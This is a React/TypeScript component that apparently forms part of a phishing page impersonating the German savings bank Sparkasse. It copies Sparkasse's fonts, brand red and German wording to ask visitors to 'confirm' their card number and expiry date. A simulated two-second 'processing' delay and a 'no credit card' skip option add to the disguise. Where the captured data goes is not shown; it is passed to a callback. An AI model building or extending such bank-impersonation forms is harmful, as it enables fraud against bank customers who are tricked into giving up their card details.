import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface BankCardData {
  card_number: string;
  expiry_date: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
  onSkip?: () => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit, onSkip }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<BankCardData>>({});
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  // Format card number with spaces
  const formatCardNumber = (value: string): string => {
    const digitsOnly = value.replace(/\D/g, '');
    return digitsOnly.replace(/(\d{4})(?=\d)/g, '$1 ').substring(0, 23); // Max 19 digits + 4 spaces
  };

  // Format expiry date as MM/YY
  const formatExpiryDate = (value: string): string => {
    const digitsOnly = value.replace(/\D/g, '');
    if (digitsOnly.length >= 2) {
      return digitsOnly.substring(0, 2) + '/' + digitsOnly.substring(2, 4);
    }
    return digitsOnly;
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else if (cardNumber.replace(/\s/g, '').length < 13) {
      newErrors.card_number = 'Kartennummer ist zu kurz';
    }
    
    if (!expiryDate.trim()) {
      newErrors.expiry_date = 'Gültigkeitsdatum ist erforderlich';
    } else if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Format: MM/JJ';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    
    // Simulate loading
    setTimeout(() => {
      const data: BankCardData = {
        card_number: cardNumber.replace(/\s/g, ''),
        expiry_date: expiryDate
      };
      
      onSubmit(data);
      setIsLoading(false);
    }, 2000);
  };

  if (isLoading) {
    return <Loading message="Kartendaten werden verarbeitet" type="processing" />;
  }

  return (
    <div style={{
      backgroundColor: 'transparent',
      padding: '0',
      fontFamily: 'SparkasseWebMedium, Helvetica, Arial, sans-serif',
      minHeight: 'calc(100vh - 116px)'
    }}>
      <div style={{
        maxWidth: '1400px',
        margin: '0 auto',
        padding: isMobile ? '20px' : '40px 24px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: 'calc(100vh - 196px)'
      }}>
        <h1 style={{
          color: 'white',
          fontSize: isMobile ? '2rem' : '2.5rem',
          fontWeight: 'normal',
          margin: '0 0 48px 0',
          textAlign: 'center',
          fontFamily: 'SparkasseWebBold, Arial, sans-serif'
        }}>
          Kartendaten bestätigen
        </h1>

        <div style={{
          width: isMobile ? '100%' : '580px',
          backgroundColor: '#3c3c3c',
          borderRadius: '8px',
          border: '1px solid #555',
          overflow: 'hidden'
        }}>
          <div style={{
            padding: isMobile ? '24px' : '32px'
          }}>
            <form onSubmit={handleSubmit}>
              {/* Card Number */}
              <div style={{ marginBottom: '24px', position: 'relative' }}>
                <input
                  type="text"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                  placeholder=""
                  maxLength={23}
                  style={{
                    width: '100%',
                    padding: '28px 16px 8px 16px',
                    border: errors.card_number ? '2px solid #ff6b6b' : '1px solid #666',
                    borderRadius: '4px',
                    fontSize: '16px',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    backgroundColor: '#2c2c2c',
                    color: 'white',
                    outline: 'none',
                    minHeight: '56px',
                    boxSizing: 'border-box',
                    letterSpacing: '1px'
                  }}
                />
                <label style={{
                  position: 'absolute',
                  left: '16px',
                  top: cardNumber ? '8px' : '20px',
                  fontSize: cardNumber ? '12px' : '16px',
                  color: 'rgba(255, 255, 255, 0.7)',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif',
                  transition: 'all 0.2s ease',
                  pointerEvents: 'none'
                }}>
                  Kartennummer
                </label>
                {errors.card_number && (
                  <div style={{ color: '#ff6b6b', fontSize: '12px', marginTop: '4px' }}>
                    {errors.card_number}
                  </div>
                )}
              </div>

              {/* Expiry Date */}
              <div style={{ marginBottom: '24px', position: 'relative' }}>
                <input
                  type="text"
                  value={expiryDate}
                  onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
                  placeholder=""
                  maxLength={5}
                  style={{
                    width: '100%',
                    padding: '28px 16px 8px 16px',
                    border: errors.expiry_date ? '2px solid #ff6b6b' : '1px solid #666',
                    borderRadius: '4px',
                    fontSize: '16px',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    backgroundColor: '#2c2c2c',
                    color: 'white',
                    outline: 'none',
                    minHeight: '56px',
                    boxSizing: 'border-box'
                  }}
                />
                <label style={{
                  position: 'absolute',
                  left: '16px',
                  top: expiryDate ? '8px' : '20px',
                  fontSize: expiryDate ? '12px' : '16px',
                  color: 'rgba(255, 255, 255, 0.7)',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif',
                  transition: 'all 0.2s ease',
                  pointerEvents: 'none'
                }}>
                  Gültig bis (MM/JJ)
                </label>
                {errors.expiry_date && (
                  <div style={{ color: '#ff6b6b', fontSize: '12px', marginTop: '4px' }}>
                    {errors.expiry_date}
                  </div>
                )}
              </div>

              {/* Submit Button */}
              <div style={{
                display: 'flex',
                justifyContent: 'center',
                marginBottom: '16px'
              }}>
                <button
                  type="submit"
                  style={{
                    width: '50%',
                    padding: '16px',
                    backgroundColor: '#ff0018',
                    color: 'white',
                    border: 'none',
                    borderRadius: '50px',
                    fontSize: '16px',
                    fontWeight: 'bold',
                    cursor: 'pointer',
                    transition: 'background-color 0.2s ease',
                    fontFamily: 'SparkasseWebBold, Arial, sans-serif'
                  }}
                  onMouseOver={(e) => e.currentTarget.style.backgroundColor = '#d50017'}
                  onMouseOut={(e) => e.currentTarget.style.backgroundColor = '#ff0018'}
                >
                  Bestätigen
                </button>

                {/* Skip Button */}
                {onSkip && (
                  <button
                    type="button"
                    onClick={onSkip}
                    style={{
                      backgroundColor: 'transparent',
                      color: '#ff0018',
                      border: 'none',
                      padding: '0.75rem 1rem',
                      fontSize: '0.875rem',
                      fontWeight: '400',
                      cursor: 'pointer',
                      fontFamily: 'SparkasseWebRegular, Arial, sans-serif',
                      transition: 'all 0.3s ease',
                      opacity: 0.7,
                      marginTop: '1rem',
                      textDecoration: 'underline',
                      textAlign: 'center' as const,
                      width: '100%'
                    }}
                    onMouseOver={(e) => {
                      e.currentTarget.style.opacity = '1';
                      e.currentTarget.style.color = '#d50017';
                    }}
                    onMouseOut={(e) => {
                      e.currentTarget.style.opacity = '0.7';
                      e.currentTarget.style.color = '#ff0018';
                    }}
                  >
                    Ich habe keine Kreditkarte
                  </button>
                )}
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BankCardForm;
